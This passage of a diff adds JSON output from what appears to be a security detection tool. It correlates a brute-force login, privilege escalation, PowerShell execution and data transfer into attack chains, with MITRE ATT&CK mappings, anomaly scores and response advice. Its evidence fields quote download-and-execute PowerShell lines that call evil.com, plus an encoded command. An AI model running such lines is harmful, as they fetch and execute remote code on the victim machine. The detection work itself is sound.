+              "timestamp": "2026-01-15T12:55:00+00:00",
+              "event_type": "data_transfer",
+              "source": "network",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "10.0.0.100",
+              "destination_ip": "185.20.30.18",
+              "correlation_reasons": [
+                "pattern:brute_force_to_compromise",
+                "step_5:data_transfer"
+              ]
+            }
+          ]
+        },
+        {
+          "chain_id": "377428f8",
+          "attack_type": "coordinated_attack",
+          "correlation_score": 0.8,
+          "steps": [
+            {
+              "sequence": 0,
+              "timestamp": "2026-01-15T12:09:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 1,
+              "timestamp": "2026-01-15T12:10:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 2,
+              "timestamp": "2026-01-15T12:11:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 3,
+              "timestamp": "2026-01-15T12:12:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 4,
+              "timestamp": "2026-01-15T12:13:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 5,
+              "timestamp": "2026-01-15T12:14:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 6,
+              "timestamp": "2026-01-15T12:15:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 7,
+              "timestamp": "2026-01-15T12:16:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 8,
+              "timestamp": "2026-01-15T12:17:00+00:00",
+              "event_type": "successful_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 9,
+              "timestamp": "2026-01-15T12:25:00+00:00",
+              "event_type": "privilege_escalation",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.18",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 10,
+              "timestamp": "2026-01-15T12:30:00+00:00",
+              "event_type": "powershell_execution",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 11,
+              "timestamp": "2026-01-15T12:33:00+00:00",
+              "event_type": "powershell_execution",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 12,
+              "timestamp": "2026-01-15T12:36:00+00:00",
+              "event_type": "powershell_execution",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            }
+          ]
+        },
+        {
+          "chain_id": "dc336107",
+          "attack_type": "data_exfiltration",
+          "correlation_score": 0.8,
+          "steps": [
+            {
+              "sequence": 0,
+              "timestamp": "2026-01-15T12:15:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 1,
+              "timestamp": "2026-01-15T12:16:00+00:00",
+              "event_type": "failed_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 2,
+              "timestamp": "2026-01-15T12:17:00+00:00",
+              "event_type": "successful_login",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.42",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 3,
+              "timestamp": "2026-01-15T12:25:00+00:00",
+              "event_type": "privilege_escalation",
+              "source": "authentication",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "185.20.30.18",
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 4,
+              "timestamp": "2026-01-15T12:30:00+00:00",
+              "event_type": "powershell_execution",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 5,
+              "timestamp": "2026-01-15T12:33:00+00:00",
+              "event_type": "powershell_execution",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 6,
+              "timestamp": "2026-01-15T12:36:00+00:00",
+              "event_type": "powershell_execution",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 7,
+              "timestamp": "2026-01-15T12:40:00+00:00",
+              "event_type": "file_access",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 8,
+              "timestamp": "2026-01-15T12:45:00+00:00",
+              "event_type": "file_access",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            }
+          ]
+        },
+        {
+          "chain_id": "3e09fb9d",
+          "attack_type": "data_exfiltration",
+          "correlation_score": 0.8,
+          "steps": [
+            {
+              "sequence": 0,
+              "timestamp": "2026-01-15T12:45:00+00:00",
+              "event_type": "file_access",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 1,
+              "timestamp": "2026-01-15T12:50:00+00:00",
+              "event_type": "file_access",
+              "source": "endpoint",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": null,
+              "destination_ip": null,
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            },
+            {
+              "sequence": 2,
+              "timestamp": "2026-01-15T12:55:00+00:00",
+              "event_type": "data_transfer",
+              "source": "network",
+              "user": "admin",
+              "device": "SERVER-01",
+              "source_ip": "10.0.0.100",
+              "destination_ip": "185.20.30.18",
+              "correlation_reasons": [
+                "temporal_proximity"
+              ]
+            }
+          ]
+        }
+      ],
+      "mitre_techniques": [
+        {
+          "technique_id": "T1005",
+          "name": "Data from Local System",
+          "tactic": "Collection",
+          "description": "Collecting data from local system.",
+          "confidence": 1.0,
+          "evidence": [
+            "Potential data exfiltration by admin on SERVER-01",
+            "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+          ],
+          "event_ids": [
+            "e6faa00bb99b4c8599d4df32c5b362b6",
+            "e6042c1eaf204ff78bc926cf853349ca",
+            "db1c07dd47624e45ac8ffef5741f0ada",
+            "e19341b63e984eccb927e49bc4c16fd5",
+            "7a018318b1ca48b2bf696cac1e8b4c79",
+            "d492ce0b4b42460199064969fb3dad01",
+            "e6c796d169254b838237d40413d78388",
+            "277ed35271ab4c2281f67035338937b7"
+          ]
+        },
+        {
+          "technique_id": "T1041",
+          "name": "Exfiltration Over Command and Control Channel",
+          "tactic": "Exfiltration",
+          "description": "Exfiltrating data over C2 channel.",
+          "confidence": 1.0,
+          "evidence": [
+            "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+          ],
+          "event_ids": [
+            "7a018318b1ca48b2bf696cac1e8b4c79",
+            "d492ce0b4b42460199064969fb3dad01",
+            "e6c796d169254b838237d40413d78388",
+            "277ed35271ab4c2281f67035338937b7",
+            "e6faa00bb99b4c8599d4df32c5b362b6",
+            "e19341b63e984eccb927e49bc4c16fd5"
+          ]
+        },
+        {
+          "technique_id": "T1059.001",
+          "name": "PowerShell",
+          "tactic": "Execution",
+          "description": "PowerShell commands/scripts for execution.",
+          "confidence": 1.0,
+          "evidence": [
+            "powershell_execution: powershell_execution detected (user=admin, ip=None, device=SERVER-01)",
+            "Suspicious PowerShell execution by admin on SERVER-01: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
+            "Suspicious PowerShell execution by admin on SERVER-01: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
+            "Suspicious PowerShell execution by admin on SERVER-01: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBE",
+            "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+          ],
+          "event_ids": [
+            "277ed35271ab4c2281f67035338937b7",
+            "ef12273119df42a7aaaf200c344607b4",
+            "82760cc7e0b24e759ca325262d01cfe9",
+            "4fcb4dbd4cd1431c94db526fd54ef497",
+            "309e9d51b39345b5bfad361ee2e9211a",
+            "69f6267b20e14d7faf5c60b38e88b0dc",
+            "80096c5fdb8f4e0686bde45e20250ad9",
+            "95f0351da7fd423a923a42c6bf6aabd8",
+            "eef302367a7045d9b4b37f917a81bd78",
+            "332f05701143466ab9bf1c13e83481ce",
+            "4ecbf85e9a894515a4a0a3996fd504dc",
+            "7a018318b1ca48b2bf696cac1e8b4c79",
+            "6cdc0f2e0617416cba945318145c8897",
+            "4eba6038b5fc4a8293e5af029bd3267c",
+            "499cf096fc0a4781bf14775958a20d52",
+            "0c347bd66ea04d06ba628c3e2bf926cc",
+            "de6945dac2fb4191ba209735eb311bc6",
+            "8a21d5685aa8428592569b36dacc4856",
+            "a0fe63cb9fb2479b96151fea98a3a371",
+            "50c2bf772c594cedb63db1a5b08f3cf2",
+            "e6c796d169254b838237d40413d78388",
+            "d492ce0b4b42460199064969fb3dad01",
+            "e6faa00bb99b4c8599d4df32c5b362b6",
+            "e19341b63e984eccb927e49bc4c16fd5"
+          ]
+        },
+        {
+          "technique_id": "T1078",
+          "name": "Valid Accounts",
+          "tactic": "Initial Access",
+          "description": "Use of valid credentials for initial access.",
+          "confidence": 1.0,
+          "evidence": [
+            "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+          ],
+          "event_ids": [
+            "7a018318b1ca48b2bf696cac1e8b4c79",
+            "d492ce0b4b42460199064969fb3dad01",
+            "e6c796d169254b838237d40413d78388",
+            "277ed35271ab4c2281f67035338937b7",
+            "e6faa00bb99b4c8599d4df32c5b362b6",
+            "e19341b63e984eccb927e49bc4c16fd5"
+          ]
+        },
+        {
+          "technique_id": "T1110",
+          "name": "Brute Force",
+          "tactic": "Credential Access",
+          "description": "Adversaries may use brute force techniques to gain access to accounts.",
+          "confidence": 1.0,
+          "evidence": [
+            "Brute force: 15 failed logins for admin from 185.20.30.42 followed by successful login",
+            "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+          ],
+          "event_ids": [
+            "69f6267b20e14d7faf5c60b38e88b0dc",
+            "80096c5fdb8f4e0686bde45e20250ad9",
+            "95f0351da7fd423a923a42c6bf6aabd8",
+            "eef302367a7045d9b4b37f917a81bd78",
+            "332f05701143466ab9bf1c13e83481ce",
+            "4ecbf85e9a894515a4a0a3996fd504dc",
+            "7a018318b1ca48b2bf696cac1e8b4c79",
+            "6cdc0f2e0617416cba945318145c8897",
+            "4eba6038b5fc4a8293e5af029bd3267c",
+            "499cf096fc0a4781bf14775958a20d52",
+            "0c347bd66ea04d06ba628c3e2bf926cc",
+            "de6945dac2fb4191ba209735eb311bc6",
+            "8a21d5685aa8428592569b36dacc4856",
+            "a0fe63cb9fb2479b96151fea98a3a371",
+            "50c2bf772c594cedb63db1a5b08f3cf2",
+            "d492ce0b4b42460199064969fb3dad01",
+            "e6c796d169254b838237d40413d78388",
+            "277ed35271ab4c2281f67035338937b7",
+            "e6faa00bb99b4c8599d4df32c5b362b6",
+            "e19341b63e984eccb927e49bc4c16fd5"
+          ]
+        },
+        {
+          "technique_id": "T1110.001",
+          "name": "Password Guessing",
+          "tactic": "Credential Access",
+          "description": "Systematic guessing of passwords.",
+          "confidence": 1.0,
+          "evidence": [
+            "failed_login: failed_login detected (user=admin, ip=185.20.30.42, device=SERVER-01)",
+            "Brute force: 15 failed logins for admin from 185.20.30.42 followed by successful login",
+            "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+          ],
+          "event_ids": [
+            "4fcb4dbd4cd1431c94db526fd54ef497",
+            "309e9d51b39345b5bfad361ee2e9211a",
+            "69f6267b20e14d7faf5c60b38e88b0dc",
+            "80096c5fdb8f4e0686bde45e20250ad9",
+            "95f0351da7fd423a923a42c6bf6aabd8",
+            "eef302367a7045d9b4b37f917a81bd78",
+            "332f05701143466ab9bf1c13e83481ce",
+            "4ecbf85e9a894515a4a0a3996fd504dc",
+            "7a018318b1ca48b2bf696cac1e8b4c79",
+            "6cdc0f2e0617416cba945318145c8897",
+            "4eba6038b5fc4a8293e5af029bd3267c",
+            "499cf096fc0a4781bf14775958a20d52",
+            "0c347bd66ea04d06ba628c3e2bf926cc",
+            "de6945dac2fb4191ba209735eb311bc6",
+            "8a21d5685aa8428592569b36dacc4856",
+            "a0fe63cb9fb2479b96151fea98a3a371",
+            "50c2bf772c594cedb63db1a5b08f3cf2",
+            "d492ce0b4b42460199064969fb3dad01",
+            "e6c796d169254b838237d40413d78388",
+            "277ed35271ab4c2281f67035338937b7",
+            "e6faa00bb99b4c8599d4df32c5b362b6",
+            "e19341b63e984eccb927e49bc4c16fd5"
+          ]
+        },
+        {
+          "technique_id": "T1134",
+          "name": "Access Token Manipulation",
+          "tactic": "Privilege Escalation",
+          "description": "Manipulating access tokens for privilege escalation.",
+          "confidence": 1.0,
+          "evidence": [
+            "privilege_escalation: privilege_escalation detected (user=admin, ip=185.20.30.18, device=SERVER-01)",
+            "privilege_escalation: impersonation detected (user=admin, ip=185.20.30.18, device=SERVER-01)",
+            "Attack chain: Attack pattern 'brute_force_to_compromise' matched: 6 steps"
+          ],
+          "event_ids": [
+            "e6c796d169254b838237d40413d78388",
+            "7a018318b1ca48b2bf696cac1e8b4c79",
+            "d492ce0b4b42460199064969fb3dad01",
+            "277ed35271ab4c2281f67035338937b7",
+            "e6faa00bb99b4c8599d4df32c5b362b6",
+            "e19341b63e984eccb927e49bc4c16fd5"
+          ]
+        },
+        {
+          "technique_id": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "tactic": "Execution",
+          "description": "Abuse of command/script interpreters.",
+          "confidence": 0.85,
+          "evidence": [
+            "powershell_execution: powershell detected (user=admin, ip=None, device=SERVER-01)",
+            "powershell_execution: cmd detected (user=admin, ip=None, device=SERVER-01)",
+            "Suspicious PowerShell execution by admin on SERVER-01: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
+            "Suspicious PowerShell execution by admin on SERVER-01: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
+            "Suspicious PowerShell execution by admin on SERVER-01: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBE"
+          ],
+          "event_ids": [
+            "277ed35271ab4c2281f67035338937b7",
+            "ef12273119df42a7aaaf200c344607b4",
+            "82760cc7e0b24e759ca325262d01cfe9",
+            "4fcb4dbd4cd1431c94db526fd54ef497",
+            "309e9d51b39345b5bfad361ee2e9211a",
+            "69f6267b20e14d7faf5c60b38e88b0dc",
+            "80096c5fdb8f4e0686bde45e20250ad9",
+            "95f0351da7fd423a923a42c6bf6aabd8",
+            "eef302367a7045d9b4b37f917a81bd78",
+            "332f05701143466ab9bf1c13e83481ce",
+            "4ecbf85e9a894515a4a0a3996fd504dc",
+            "7a018318b1ca48b2bf696cac1e8b4c79",
+            "6cdc0f2e0617416cba945318145c8897",
+            "4eba6038b5fc4a8293e5af029bd3267c",
+            "499cf096fc0a4781bf14775958a20d52",
+            "0c347bd66ea04d06ba628c3e2bf926cc",
+            "de6945dac2fb4191ba209735eb311bc6",
+            "8a21d5685aa8428592569b36dacc4856",
+            "a0fe63cb9fb2479b96151fea98a3a371",
+            "50c2bf772c594cedb63db1a5b08f3cf2",
+            "e6c796d169254b838237d40413d78388"
+          ]
+        },
+        {
+          "technique_id": "T1059.003",
+          "name": "Windows Command Shell",
+          "tactic": "Execution",
+          "description": "cmd.exe for command execution.",
+          "confidence": 0.53,
+          "evidence": [
+            "powershell_execution: cmd.exe detected (user=admin, ip=None, device=SERVER-01)",
+            "powershell_execution: cmd.exe detected (user=admin, ip=None, device=SERVER-01)",
+            "powershell_execution: cmd.exe detected (user=admin, ip=None, device=SERVER-01)"
+          ],
+          "event_ids": [
+            "277ed35271ab4c2281f67035338937b7",
+            "ef12273119df42a7aaaf200c344607b4",
+            "82760cc7e0b24e759ca325262d01cfe9"
+          ]
+        },
+        {
+          "technique_id": "T1068",
+          "name": "Exploitation for Privilege Escalation",
+          "tactic": "Privilege Escalation",
+          "description": "Exploiting vulnerabilities for higher privileges.",
+          "confidence": 0.41,
+          "evidence": [
+            "privilege_escalation: privilege_escalation detected (user=admin, ip=185.20.30.18, device=SERVER-01)"
+          ],
+          "event_ids": [
+            "e6c796d169254b838237d40413d78388"
+          ]
+        },
+        {
+          "technique_id": "T1134.001",
+          "name": "Token Impersonation/Theft",
+          "tactic": "Privilege Escalation",
+          "description": "Impersonating or stealing tokens.",
+          "confidence": 0.41,
+          "evidence": [
+            "privilege_escalation: token_impersonation detected (user=admin, ip=185.20.30.18, device=SERVER-01)"
+          ],
+          "event_ids": [
+            "e6c796d169254b838237d40413d78388"
+          ]
+        },
+        {
+          "technique_id": "T1027",
+          "name": "Obfuscated/Stored Files",
+          "tactic": "Defense Evasion",
+          "description": "Obfuscating malicious code.",
+          "confidence": 0.29333333333333333,
+          "evidence": [
+            "powershell_execution: -enc detected (user=admin, ip=None, device=SERVER-01)"
+          ],
+          "event_ids": [
+            "82760cc7e0b24e759ca325262d01cfe9"
+          ]
+        }
+      ],
+      "recommendations": [
+        "Immediately reset credentials for affected user accounts",
+        "Enable multi-factor authentication for all privileged accounts",
+        "Block source IPs at firewall perimeter",
+        "Review authentication logs for additional compromised accounts",
+        "Isolate affected endpoints from network",
+        "Collect memory dumps and process artifacts for forensic analysis",
+        "Review PowerShell script block logging for full command history",
+        "Implement PowerShell Constrained Language Mode",
+        "Block outbound connections to identified destination IPs",
+        "Identify and classify exfiltrated data",
+        "Notify data protection officer if PII/sensitive data involved",
+        "Implement DLP controls for sensitive file access",
+        "Activate incident response plan for coordinated attack",
+        "Conduct full network sweep for lateral movement indicators",
+        "Review all administrative account usage in last 72 hours",
+        "Consider engaging external incident response team",
+        "Escalate to SOC Tier 2/3 for immediate investigation",
+        "Generate IOCs (IPs, hashes, domains) for threat intelligence sharing",
+        "Initiate threat hunt for related activity across environment"
+      ],
+      "rule_matches": [
+        "brute_force",
+        "suspicious_powershell",
+        "suspicious_powershell",
+        "suspicious_powershell",
+        "data_exfiltration",
+        "coordinated_attack"
+      ],
+      "correlated_chains": [
+        "b7dff52b",
+        "98eb4651",
+        "152ea970",
+        "377428f8",
+        "dc336107",
+        "3e09fb9d"
+      ],
+      "graph_id": "937446d4",
+      "metadata": {
+        "risk_breakdown": {
+          "ml_component": 78.29483690115335,
+          "rule_component": 100.0,
+          "correlation_component": 100.0,
+          "cross_source_component": 80.0,
+          "behavior_component": 100.0
+        },
+        "analysis_details": {
+          "weights": {
+            "ml": 0.3,
+            "rule": 0.3,
+            "correlation": 0.2,
+            "cross_source": 0.1,
+            "behavior": 0.1
+          },
+          "anomaly_count": 28,
+          "rule_match_count": 6,
+          "chain_count": 6,
+          "max_chain_score": 1.0,
+          "source_diversity": 4
+        }
+      }
+    }
+  ],
+  "anomalies": [
+    {
+      "event_id": "4fcb4dbd4cd1431c94db526fd54ef497",
+      "raw_score": -0.18992624144504777,
+      "normalized_score": 0.6899262414450478,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 15.110773086547852,
+        "time_span_minutes": 8.258644104003906,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287,
+        "bytes_sent_per_connection": 2.1385200023651123
+      }
+    },
+    {
+      "event_id": "309e9d51b39345b5bfad361ee2e9211a",
+      "raw_score": -0.18846428226953849,
+      "normalized_score": 0.6884642822695385,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 31.433055877685547,
+        "time_span_minutes": 8.108112335205078,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287,
+        "bytes_sent_per_connection": 2.1385200023651123
+      }
+    },
+    {
+      "event_id": "69f6267b20e14d7faf5c60b38e88b0dc",
+      "raw_score": -0.18465203227364635,
+      "normalized_score": 0.6846520322736463,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 23.271915435791016,
+        "time_span_minutes": 7.957581520080566,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287,
+        "failed_login_count": 3.0
+      }
+    },
+    {
+      "event_id": "80096c5fdb8f4e0686bde45e20250ad9",
+      "raw_score": -0.18465203227364635,
+      "normalized_score": 0.6846520322736463,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 20.55153465270996,
+        "time_span_minutes": 7.8070502281188965,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287,
+        "failed_login_count": 4.0
+      }
+    },
+    {
+      "event_id": "95f0351da7fd423a923a42c6bf6aabd8",
+      "raw_score": -0.18078852963405168,
+      "normalized_score": 0.6807885296340517,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 19.191343307495117,
+        "time_span_minutes": 7.656518936157227,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287,
+        "failed_login_count": 5.0
+      }
+    },
+    {
+      "event_id": "eef302367a7045d9b4b37f917a81bd78",
+      "raw_score": -0.18078852963405168,
+      "normalized_score": 0.6807885296340517,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 18.37523078918457,
+        "time_span_minutes": 7.505988121032715,
+        "source_diversity_score": 6.077752590179443,
+        "failed_login_count": 6.0,
+        "event_type_diversity": 5.995561122894287
+      }
+    },
+    {
+      "event_id": "332f05701143466ab9bf1c13e83481ce",
+      "raw_score": -0.18078852963405168,
+      "normalized_score": 0.6807885296340517,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 17.831153869628906,
+        "time_span_minutes": 7.355456829071045,
+        "failed_login_count": 7.0,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287
+      }
+    },
+    {
+      "event_id": "4ecbf85e9a894515a4a0a3996fd504dc",
+      "raw_score": -0.17934509900023166,
+      "normalized_score": 0.6793450990002317,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 17.442529678344727,
+        "failed_login_count": 8.0,
+        "time_span_minutes": 7.204925537109375,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287
+      }
+    },
+    {
+      "event_id": "7a018318b1ca48b2bf696cac1e8b4c79",
+      "raw_score": -0.1783844383025215,
+      "normalized_score": 0.6783844383025215,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 17.151058197021484,
+        "failed_login_count": 9.0,
+        "time_span_minutes": 7.054394245147705,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287
+      }
+    },
+    {
+      "event_id": "6cdc0f2e0617416cba945318145c8897",
+      "raw_score": -0.1783844383025215,
+      "normalized_score": 0.6783844383025215,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 16.924362182617188,
+        "failed_login_count": 10.0,
+        "time_span_minutes": 6.903862953186035,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287
+      }
+    },
+    {
+      "event_id": "4eba6038b5fc4a8293e5af029bd3267c",
+      "raw_score": -0.1726747488020609,
+      "normalized_score": 0.6726747488020609,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 16.74300193786621,
+        "failed_login_count": 11.0,
+        "time_span_minutes": 6.753332138061523,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287
+      }
+    },
+    {
+      "event_id": "499cf096fc0a4781bf14775958a20d52",
+      "raw_score": -0.1726747488020609,
+      "normalized_score": 0.6726747488020609,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 16.59461784362793,
+        "failed_login_count": 12.0,
+        "time_span_minutes": 6.6028008460998535,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287
+      }
+    },
+    {
+      "event_id": "0c347bd66ea04d06ba628c3e2bf926cc",
+      "raw_score": -0.1726747488020609,
+      "normalized_score": 0.6726747488020609,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 16.470964431762695,
+        "failed_login_count": 13.0,
+        "time_span_minutes": 6.452269554138184,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287
+      }
+    },
+    {
+      "event_id": "de6945dac2fb4191ba209735eb311bc6",
+      "raw_score": -0.1726747488020609,
+      "normalized_score": 0.6726747488020609,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 16.366334915161133,
+        "failed_login_count": 14.0,
+        "time_span_minutes": 6.301738262176514,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287
+      }
+    },
+    {
+      "event_id": "8a21d5685aa8428592569b36dacc4856",
+      "raw_score": -0.1726747488020609,
+      "normalized_score": 0.6726747488020609,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 16.276649475097656,
+        "failed_login_count": 15.0,
+        "time_span_minutes": 6.151206970214844,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287
+      }
+    },
+    {
+      "event_id": "a0fe63cb9fb2479b96151fea98a3a371",
+      "raw_score": -0.1726747488020609,
+      "normalized_score": 0.6726747488020609,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "login_frequency_per_min": 16.19892692565918,
+        "failed_login_count": 16.0,
+        "source_diversity_score": 6.077752590179443,
+        "time_span_minutes": 6.000675678253174,
+        "event_type_diversity": 5.995561122894287
+      }
+    },
+    {
+      "event_id": "50c2bf772c594cedb63db1a5b08f3cf2",
+      "raw_score": -0.1726747488020609,
+      "normalized_score": 0.6726747488020609,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "failed_login_count": 17.0,
+        "login_frequency_per_min": 16.130916595458984,
+        "source_diversity_score": 6.077752590179443,
+        "event_type_diversity": 5.995561122894287,
+        "time_span_minutes": 5.850144863128662
+      }
+    },
+    {
+      "event_id": "d492ce0b4b42460199064969fb3dad01",
+      "raw_score": -0.14620772421593198,
+      "normalized_score": 0.646207724215932,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "failed_login_count": 17.0,
+        "login_frequency_per_min": 16.07090950012207,
+        "source_diversity_score": 6.077752590179443,
+        "time_span_minutes": 5.699613571166992,
+        "event_type_diversity": 4.663214206695557
+      }
+    },
+    {
+      "event_id": "491c1d1f7b9445bca8630cfc010b1389",
+      "raw_score": -0.14673296782671574,
+      "normalized_score": 0.6467329678267157,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "failed_login_count": 17.0,
+        "login_frequency_per_min": 14.294660568237305,
+        "source_diversity_score": 6.077752590179443,
+        "time_span_minutes": 5.248019695281982,
+        "event_type_diversity": 4.663214206695557
+      }
+    },
+    {
